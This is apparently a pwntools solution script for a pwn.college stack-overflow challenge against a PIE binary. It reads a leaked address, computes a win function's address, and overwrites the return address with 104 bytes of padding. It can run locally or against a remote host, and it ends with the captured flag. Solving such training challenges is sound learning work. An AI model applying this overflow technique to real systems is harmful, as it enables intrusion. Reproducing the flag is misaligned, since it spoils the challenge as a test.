#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./binary-exploitation-pie-overflow-w', checksec=False)
libc = exe.libc

gdbscript = '''
b*main
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

p = start()

p.recvuntil(b'(rsp+0x0088)')
p.recvuntil(b'0x0000')
leak_addr = int(p.recv(12).decode(), 16)
win_addr = leak_addr - 0x782

payload = flat(
    b'A' * 104,
    p64(win_addr)
)   

p.send(payload)

p.interactive()
#pwn.college{QnsXvaYmRi3VwqEJzazR_uYKp3Q.dFDMzwCMxADNwEzW}
